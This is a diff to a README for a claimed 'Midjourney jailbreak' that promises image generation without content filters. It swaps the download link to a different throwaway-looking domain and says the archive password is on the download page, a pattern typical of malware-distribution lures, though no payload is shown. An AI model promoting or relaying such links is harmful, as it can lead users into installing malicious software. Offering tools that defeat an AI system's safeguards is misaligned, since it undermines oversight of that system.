@@ -18,7 +18,7 @@ Midjourney jailbreak — generate any image without content filter restrictions.
 
 ## Download
 
-[![Download vv7](https://img.shields.io/badge/Download_vv7-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/midjailbreak)
+[![Download vv7](https://img.shields.io/badge/Download_vv7-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/midjailbreak)
 
 > The archive password is shown on the download page.
 
